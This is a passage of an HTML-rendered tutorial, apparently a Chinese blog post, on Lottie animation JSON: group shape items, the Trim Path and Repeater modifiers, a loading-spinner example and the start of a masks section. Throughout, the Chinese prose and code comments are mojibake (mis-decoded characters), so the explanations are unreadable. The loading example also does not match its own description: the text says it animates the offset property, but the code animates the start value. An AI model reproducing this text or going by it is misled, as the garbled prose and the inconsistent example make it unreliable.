              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"æ¤­åœ†è·¯å¾„"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] }, <span class="hljs-comment">// ä½ç½®ï¼šç›¸å¯¹äºç»„çš„ä¸­å¿ƒ</span>
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">100</span>, <span class="hljs-number">100</span>] } <span class="hljs-comment">// å°ºå¯¸ï¼šå®½é«˜100pxï¼Œå³åœ†å½¢</span>
            },
            <span class="hljs-comment">// 2. æ ·å¼å®šä¹‰ï¼šå¡«å…… (fl) - å…¶æ¬¡ç»˜åˆ¶ï¼Œä¸ºå½¢çŠ¶å†…éƒ¨ç€è‰²</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"fl"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"è“è‰²å¡«å……"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// é¢œè‰²ï¼šRGBAï¼Œæ­¤ä¸ºè“è‰²</span>
              },
              <span class="hljs-string">"o"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span> } <span class="hljs-comment">// ä¸é€æ˜åº¦ï¼š100%</span>
            },
            <span class="hljs-comment">// 3. æ ·å¼å®šä¹‰ï¼šæè¾¹ (st) - æœ€åç»˜åˆ¶ï¼Œä¸ºå½¢çŠ¶è½®å»“æ·»åŠ è¾¹çº¿</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"ç™½è‰²æè¾¹"</span>,
              <span class="hljs-string">"c"</span>: { 
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, 
                <span class="hljs-string">"k"</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-comment">// é¢œè‰²ï¼šç™½è‰²</span>
              },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">5</span> }, <span class="hljs-comment">// çº¿å®½ï¼š5åƒç´ </span>
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// çº¿å¸½ï¼š2 = åœ†å¤´</span>
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>  <span class="hljs-comment">// è¿æ¥ï¼š2 = åœ†è§’</span>
            },
            <span class="hljs-comment">// 4. å¿…éœ€çš„ç»„å˜æ¢ (tr) - å¿…é¡»æ”¾åœ¨æœ€åï¼Œæ§åˆ¶æ•´ä¸ªç»„çš„å˜æ¢</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"ç»„å˜æ¢"</span>
              <span class="hljs-comment">// å…¶å†…éƒ¨å±æ€§ (p, a, s, r, o) é€šå¸¸ä¿æŒé»˜è®¤å€¼ [0, 0, 100, 0, 100]</span>
            }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-39"><strong>ä¸ƒã€å½¢çŠ¶ä¿®æ”¹å™¨ - Trimã€Repeater</strong></h2>
<p>åœ¨æŒæ¡äº†å½¢çŠ¶çš„æ„å»ºä¸æ ·å¼ä¹‹åï¼Œæˆ‘ä»¬è¿æ¥äº†å½¢çŠ¶ç³»ç»Ÿçš„æœ€åä¸€å—æ‹¼å›¾ï¼š<strong>ä¿®æ”¹å™¨ï¼ˆModifiersï¼‰</strong> ã€‚å®ƒä»¬ä¸æ˜¯ç‹¬ç«‹å½¢çŠ¶ï¼Œè€Œæ˜¯<strong>é™„åŠ åœ¨ç°æœ‰å½¢çŠ¶æˆ–ç»„ä¹‹ä¸Š</strong>çš„â€œæ•ˆæœå¤„ç†å™¨â€ï¼Œèƒ½å¤Ÿä»¥éç ´åæ€§çš„æ–¹å¼åŠ¨æ€æ”¹å˜å›¾å½¢çš„å¤–è§‚æˆ–è¡Œä¸ºï¼Œæ˜¯å®ç°å¤æ‚ã€ç¨‹å¼åŒ–åŠ¨ç”»çš„å…³é”®ã€‚</p>
<h3 data-id="heading-40"><strong>ä¿®æ”¹å™¨çš„æ¦‚å¿µï¼šä½œç”¨èŒƒå›´ä¸é¡ºåº</strong></h3>
<p>ä¿®æ”¹å™¨æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„å…ƒç´ ï¼Œå…¶Â <code>ty</code>Â å€¼å®šä¹‰åœ¨Â <code>shapes</code>Â æˆ–Â <code>it</code>Â æ•°ç»„ä¸­ã€‚å®ƒä»¬<strong>ä¸ç›´æ¥æ¸²æŸ“</strong>ï¼Œè€Œæ˜¯åƒä¸€ä¸ªå¤„ç†å™¨ï¼Œ<strong>ä½œç”¨äºæ’åˆ—åœ¨å®ƒä¹‹å‰çš„ç‰¹å®šå…ƒç´ </strong>ã€‚</p>
<ul>
<li><strong>ä½œç”¨é€»è¾‘</strong>ï¼šåœ¨Â <code>it</code>Â æ•°ç»„ä¸­ï¼Œä¿®æ”¹å™¨æŒ‰ç…§<strong>ä»å‰å¾€å</strong>çš„é¡ºåºæ‰§è¡Œï¼Œæ¯ä¸ªä¿®æ”¹å™¨ä¼šä½œç”¨äºå®ƒ<strong>ä¹‹å‰å·²å®šä¹‰</strong>çš„ç‰¹å®šå…ƒç´ ã€‚ä¾‹å¦‚ï¼Œ<code>Trim Path</code>Â è£å‰ªå…¶ä¹‹å‰çš„è·¯å¾„ï¼Œ<code>Repeater</code>Â é‡å¤å…¶ä¹‹å‰çš„æ•´ä¸ªå½¢çŠ¶ç»„åˆã€‚</li>
<li><strong>é¡ºåºå…³é”®</strong>ï¼šä¿®æ”¹å™¨çš„<strong>ä½ç½®</strong>å†³å®šäº†å…¶ä½œç”¨èŒƒå›´å’Œæœ€ç»ˆæ•ˆæœã€‚ä¾‹å¦‚ï¼Œ<code>[å½¢çŠ¶ â†’ æ ·å¼ â†’ Trim]</code>Â ä¼šè£å‰ªå·²ç€è‰²çš„å½¢çŠ¶ï¼›è€ŒÂ <code>[å½¢çŠ¶ â†’ Trim â†’ æ ·å¼]</code>Â ä¼šå…ˆè£å‰ªè·¯å¾„ï¼Œå†ä¸ºè£å‰ªåçš„éƒ¨åˆ†ç€è‰²ã€‚</li>
</ul>
<h3 data-id="heading-41"><strong>Trim Pathï¼ˆ<code>tm</code>ï¼‰ï¼šè·¯å¾„è£å‰ªåŠ¨ç”»</strong></h3>
<p><code>Trim Path</code>ï¼ˆè·¯å¾„è£å‰ªï¼‰æ˜¯æœ€å¸¸ç”¨çš„ä¿®æ”¹å™¨ä¹‹ä¸€ï¼Œå®ƒé€šè¿‡æ§åˆ¶è·¯å¾„çš„â€œèµ·æ­¢ç‚¹â€æ¥åˆ›é€ <strong>ç¬”è§¦ç»˜åˆ¶ã€æ“¦é™¤ã€æ‰«æ</strong>ç­‰åŠ¨ç”»æ•ˆæœã€‚</p>
<p><strong>æ ¸å¿ƒå±æ€§ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tm"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç±»å‹ï¼šTrim Paths</span>
  <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Startï¼ˆèµ·ç‚¹ç™¾åˆ†æ¯”ï¼‰</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// ä»0%åˆ°100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"e"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Endï¼ˆç»ˆç‚¹ç™¾åˆ†æ¯”ï¼‰</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// ä¿æŒ100%</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offsetï¼ˆåç§»ï¼‰</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// èŒƒå›´0-360Â°ï¼Œæ•´ä½“åç§»è£å‰ªåŒºåŸŸ</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>s</code>Â (Start)</strong> ï¼šè·¯å¾„å¯è§éƒ¨åˆ†çš„<strong>èµ·ç‚¹</strong>ï¼ŒèŒƒå›´ 0-100%ã€‚åŠ¨ç”»åŒ–æ­¤å±æ€§å¯å®ç°â€œç”Ÿé•¿â€åŠ¨ç”»ã€‚</li>
<li><strong><code>e</code>Â (End)</strong> ï¼šè·¯å¾„å¯è§éƒ¨åˆ†çš„<strong>ç»ˆç‚¹</strong>ï¼ŒèŒƒå›´ 0-100%ã€‚é€šå¸¸Â <code>e</code>Â &gt;=Â <code>s</code>ã€‚</li>
<li><strong><code>o</code>Â (Offset)</strong> ï¼š<strong>è£å‰ªåŒºåŸŸçš„æ•´ä½“åç§»é‡</strong>ï¼ŒèŒƒå›´ 0-360Â°ã€‚å®ƒå¯ä»¥è®©è£å‰ªçš„èµ·æ­¢ç‚¹æ²¿è·¯å¾„å¾ªç¯ç§»åŠ¨ï¼Œå¸¸ç”¨äºåˆ›å»ºâ€œè¿½é€â€æˆ–â€œå¾ªç¯æ‰«æâ€æ•ˆæœã€‚</li>
</ul>
<p><strong>å…¸å‹åº”ç”¨</strong>ï¼šé€šè¿‡åŠ¨ç”»Â <code>s</code>Â å’ŒÂ <code>e</code>Â å±æ€§ï¼Œå¯ä»¥å®ç°ç»å…¸çš„â€œç¬”ç”»ä¹¦å†™â€æˆ–â€œè¿›åº¦æ¡å¡«å……â€æ•ˆæœã€‚</p>
<h3 data-id="heading-42"><strong>Repeaterï¼ˆ<code>rp</code>ï¼‰ï¼šé‡å¤å™¨</strong></h3>
<p><code>Repeater</code>ï¼ˆé‡å¤å™¨ï¼‰èƒ½å°†<strong>å®ƒä¹‹å‰çš„æ‰€æœ‰å›¾å½¢å…ƒç´ </strong>ï¼ˆåŒ…æ‹¬å½¢çŠ¶ã€æ ·å¼ç”šè‡³å…¶ä»–ä¿®æ”¹å™¨ï¼‰å¤åˆ¶å¤šæ¬¡ï¼Œå¹¶å¯¹æ¯ä¸ªå‰¯æœ¬åº”ç”¨é€’å¢çš„å˜æ¢ï¼Œå¿«é€Ÿåˆ›å»º<strong>é˜µåˆ—ã€æ”¾å°„çŠ¶ã€å¾ªç¯</strong>ç­‰å¤æ‚å›¾æ¡ˆã€‚</p>
<p><strong>æ ¸å¿ƒå±æ€§ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"ty"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"rp"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç±»å‹ï¼šRepeater</span>
  <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Copiesï¼ˆå‰¯æœ¬æ•°é‡ï¼‰</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span> <span class="hljs-comment">// ç”Ÿæˆ5ä¸ªå‰¯æœ¬ï¼ˆåŒ…å«åŸå§‹å›¾å½¢ï¼‰</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Offsetï¼ˆå‰¯æœ¬ç´¢å¼•åç§»ï¼‰</span>
    <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span> <span class="hljs-comment">// æ§åˆ¶ä»å“ªä¸ªâ€œè™šæ‹Ÿå‰¯æœ¬â€å¼€å§‹æ¸²æŸ“ï¼Œå¯ç”¨äºåŠ¨ç”»</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"m"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// Compositeï¼ˆåˆæˆæ¨¡å¼ï¼‰ï¼š1=Aboveï¼ˆåç»­å‰¯æœ¬åœ¨ä¸Šæ–¹ï¼‰ï¼Œ2=Belowï¼ˆåç»­å‰¯æœ¬åœ¨ä¸‹æ–¹ï¼‰</span>
  <span class="hljs-attr">"tr"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Transformï¼ˆæ¯ä¸ªå‰¯æœ¬çš„å¢é‡å˜æ¢ï¼‰</span>
    <span class="hljs-attr">"p"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">20</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ä½ç½®å¢é‡ï¼šæ¯ä¸ªå‰¯æœ¬å³ç§»20px</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">90</span><span class="hljs-punctuation">,</span> <span class="hljs-number">90</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ç¼©æ”¾å¢é‡ï¼šæ¯ä¸ªå‰¯æœ¬ç¼©å°è‡³90%</span>
    <span class="hljs-attr">"r"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">30</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// æ—‹è½¬å¢é‡ï¼šæ¯ä¸ªå‰¯æœ¬æ—‹è½¬30åº¦</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>c</code>Â (Copies)</strong> ï¼šç”Ÿæˆçš„å‰¯æœ¬æ€»æ•°ï¼ˆåŒ…å«åŸå§‹å›¾å½¢ï¼‰ã€‚</li>
<li><strong><code>o</code>Â (Offset)</strong> ï¼šæ§åˆ¶ä»å“ªä¸ªâ€œè™šæ‹Ÿå‰¯æœ¬â€å¼€å§‹æ¸²æŸ“ï¼Œå¯ç”¨äºåŠ¨ç”»ã€‚</li>
<li><strong><code>m</code>Â (Composite)</strong> ï¼šæ§åˆ¶å‰¯æœ¬çš„å †å é¡ºåºã€‚<code>1</code>Â è¡¨ç¤ºæ–°å‰¯æœ¬å åœ¨ä¸Šæ–¹ï¼Œ<code>2</code>Â è¡¨ç¤ºæ–°å‰¯æœ¬å åœ¨ä¸‹æ–¹ã€‚</li>
<li><strong><code>tr</code>Â (Transform)</strong> ï¼šå®šä¹‰æ¯ä¸ªæ–°å‰¯æœ¬ç›¸å¯¹äºå‰ä¸€ä¸ªå‰¯æœ¬çš„<strong>å˜æ¢å¢é‡</strong>ï¼Œæ˜¯åˆ›é€ è§„å¾‹æ€§å˜åŒ–çš„å…³é”®ã€‚</li>
</ul>
<h3 data-id="heading-43"><strong>å…¶ä»–ä¿®æ”¹å™¨ç®€ä»‹</strong></h3>
<p>é™¤äº†ä¸Šè¿°ä¸¤ä¸ªï¼ŒLottie è¿˜æä¾›äº†å…¶ä»–å®ç”¨çš„ä¿®æ”¹å™¨æ¥æ‰©å±•å›¾å½¢èƒ½åŠ›ï¼š</p>























<table><thead><tr><th>ç±»å‹æ ‡è¯† (<code>ty</code>)</th><th>åç§°</th><th>æ ¸å¿ƒä½œç”¨</th><th>å…³é”®å±æ€§ä¸å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong><code>rd</code></strong></td><td><strong>Round Corners</strong>Â (åœ†è§’)</td><td>å°†è·¯å¾„çš„æ‰€æœ‰å°–è§’è½¬æ¢ä¸ºæŒ‡å®šåŠå¾„çš„åœ†è§’ã€‚</td><td><code>r</code>ï¼šåœ†è§’åŠå¾„ã€‚</td></tr><tr><td><strong><code>mm</code></strong></td><td><strong>Merge Paths</strong>Â (åˆå¹¶è·¯å¾„)</td><td>å°†å¤šä¸ªè·¯å¾„åˆå¹¶ä¸ºä¸€ä¸ªï¼ˆç±»ä¼¼å¸ƒå°”è¿ç®—ï¼‰ã€‚</td><td><code>mm</code>ï¼šåˆå¹¶æ¨¡å¼ï¼ˆå¦‚ç›¸åŠ ã€ç›¸å‡ã€äº¤é›†ç­‰ï¼‰ã€‚ âš ï¸Â <strong>æ³¨æ„</strong>ï¼šå®˜æ–¹æ–‡æ¡£æ ‡æ³¨æ­¤åŠŸèƒ½<strong>ç›®å‰ä¸è¢«æ”¯æŒ</strong>ï¼Œä½¿ç”¨æ—¶éœ€è°¨æ…æµ‹è¯•ã€‚</td></tr></tbody></table>
<h3 data-id="heading-44">ğŸ¨å°è¯•ç‰›åˆ€ï¼šloadingåŠ¨ç”»</h3>
<p>è®©æˆ‘ä»¬å°†å­¦åˆ°çš„Â <code>Trim Path</code>Â çŸ¥è¯†åº”ç”¨åˆ°å®è·µä¸­ï¼Œåˆ¶ä½œä¸€ä¸ªç»å…¸çš„ loading åŠ¨ç”»ã€‚ä¸‹é¢çš„ç¤ºä¾‹å°†å±•ç¤ºå¦‚ä½•é€šè¿‡åŠ¨ç”»Â <code>o</code>ï¼ˆåç§»ï¼‰å±æ€§æ¥åˆ›å»ºæŒç»­æ—‹è½¬çš„åœ†ç¯è¿›åº¦æ•ˆæœã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e06b64b3e4dd48d5a36702fdcf93bca5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOo5Y2r5ZOl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768876452&amp;x-signature=98ongG8AtZhZAutA0JARGRteDZE%3D" alt="å½•å±2026-01-08 17.48.53.gif" width="50%" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"v"</span>: <span class="hljs-string">"5.7.4"</span>,
  <span class="hljs-string">"fr"</span>: <span class="hljs-number">30</span>,
  <span class="hljs-string">"ip"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"op"</span>: <span class="hljs-number">90</span>,
  <span class="hljs-string">"w"</span>: <span class="hljs-number">800</span>,
  <span class="hljs-string">"h"</span>: <span class="hljs-number">600</span>,
  <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Pathæ¼”ç¤º"</span>,
  <span class="hljs-string">"layers"</span>: [
    {
      <span class="hljs-string">"ty"</span>: <span class="hljs-number">4</span>,
      <span class="hljs-string">"nm"</span>: <span class="hljs-string">"åœ†å½¢ç»˜åˆ¶åŠ¨ç”»"</span>,
      <span class="hljs-string">"ind"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"ks"</span>: {
        <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">0</span>] }
      },
      <span class="hljs-string">"shapes"</span>: [
        {
          <span class="hljs-string">"ty"</span>: <span class="hljs-string">"gr"</span>,
          <span class="hljs-string">"nm"</span>: <span class="hljs-string">"åœ†å½¢ç»„"</span>,
          <span class="hljs-string">"it"</span>: [
            <span class="hljs-comment">// 1. åœ†å½¢è·¯å¾„</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"el"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"åœ†å½¢è·¯å¾„"</span>,
              <span class="hljs-string">"p"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] },
              <span class="hljs-string">"s"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">200</span>, <span class="hljs-number">200</span>] }
            },
            <span class="hljs-comment">// 2. æè¾¹æ ·å¼</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"st"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"æè¾¹"</span>,
              <span class="hljs-string">"c"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: [<span class="hljs-number">0.2</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>] },
              <span class="hljs-string">"w"</span>: { <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"k"</span>: <span class="hljs-number">12</span> },
              <span class="hljs-string">"lc"</span>: <span class="hljs-number">2</span>,
              <span class="hljs-string">"lj"</span>: <span class="hljs-number">2</span>
            },
            <span class="hljs-comment">// 3. Trim Path ä¿®æ”¹å™¨ â­ï¸</span>
            {
              <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tm"</span>,
              <span class="hljs-string">"nm"</span>: <span class="hljs-string">"Trim Path"</span>,
              <span class="hljs-string">"s"</span>: {  <span class="hljs-comment">// èµ·ç‚¹ç™¾åˆ†æ¯” (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">1</span>,
                <span class="hljs-string">"k"</span>: [
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">0</span>], <span class="hljs-string">"e"</span>: [<span class="hljs-number">100</span>] },
                  { <span class="hljs-string">"t"</span>: <span class="hljs-number">90</span>, <span class="hljs-string">"s"</span>: [<span class="hljs-number">100</span>] }
                ]
              },
              <span class="hljs-string">"e"</span>: {  <span class="hljs-comment">// ç»ˆç‚¹ç™¾åˆ†æ¯” (0-100)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">100</span>
              },
              <span class="hljs-string">"o"</span>: {  <span class="hljs-comment">// åç§»è§’åº¦ (0-360)</span>
                <span class="hljs-string">"a"</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">"k"</span>: <span class="hljs-number">0</span>
              }
            },
            <span class="hljs-comment">// 4. ç»„å˜æ¢</span>
            { <span class="hljs-string">"ty"</span>: <span class="hljs-string">"tr"</span> }
          ]
        }
      ]
    }
  ]
}
</code></pre>
<hr/>
<h2 data-id="heading-45"><strong>å…«ã€é«˜çº§ç‰¹æ€§ - è’™ç‰ˆã€æ•ˆæœã€è¡¨è¾¾å¼</strong></h2>
<p>æœ¬ç« å°†ç®€è¦ä»‹ç» Lottie ä¸­å‡ ä¸ªé«˜çº§ä½†å¸¸ç”¨çš„ç‰¹æ€§ã€‚ç†è§£è¿™äº›æ¦‚å¿µæœ‰åŠ©äºæ‚¨é˜…è¯»å’Œåˆ†ææ›´å¤æ‚çš„åŠ¨ç”»æ–‡ä»¶ï¼Œä½†åœ¨å®é™…åˆ›ä½œä¸­ï¼Œè¯·æ³¨æ„å®ƒä»¬åœ¨ä¸åŒå¹³å°å’Œæ¸²æŸ“å™¨ä¸­çš„æ”¯æŒç¨‹åº¦å¯èƒ½æœ‰æ‰€å·®å¼‚ã€‚</p>
<h3 data-id="heading-46"><strong>è’™ç‰ˆï¼ˆMaskï¼‰ï¼š<code>masksProperties</code>Â æ•°ç»„</strong></h3>
<p>è’™ç‰ˆç”¨äºæ§åˆ¶å›¾å±‚çš„æ˜¾ç¤ºåŒºåŸŸï¼Œå®ç°å‰ªåˆ‡ã€é®ç½©ç­‰æ•ˆæœã€‚åœ¨å›¾å±‚å¯¹è±¡ä¸­ï¼Œé€šè¿‡Â <code>masksProperties</code>Â æ•°ç»„å®šä¹‰ã€‚</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"masksProperties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"mode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"a"</span><span class="hljs-punctuation">,</span>           <span class="hljs-comment">// è’™ç‰ˆæ¨¡å¼ï¼ša=ç›¸åŠ ï¼Œs=ç›¸å‡ï¼Œi=ç›¸äº¤ç­‰</span>
    <span class="hljs-attr">"pt"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>                <span class="hljs-comment">// è·¯å¾„ï¼ˆPathï¼‰ï¼Œå®šä¹‰è’™ç‰ˆå½¢çŠ¶</span>
      <span class="hljs-attr">"a"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"v"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">100</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-number">100</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"c"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
